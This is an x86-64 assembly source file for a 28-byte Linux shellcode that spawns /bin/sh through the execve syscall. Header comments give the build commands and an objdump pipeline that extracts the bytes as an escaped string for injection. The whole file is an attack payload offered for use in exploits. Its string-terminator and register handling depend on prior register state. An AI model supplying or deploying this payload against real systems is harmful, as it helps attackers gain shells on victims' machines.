; execve x64 /bin/sh - 28 bytes   by 0bfxgh0st*
;
; nasm -f elf64 execve_x64_sh.asm
; ld -o execve_x64_sh execve_x64_sh.o -m elf_x86_64
; objdump -d execve_x64_sh |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
section .text

global _start

_start:

xor rdx,rdx

push r8
mov r8, 0x68732f6e69622f2f
push r8

mov rdi, rsp

push rdx

mov rsi, rsp

mov al, 59
syscall
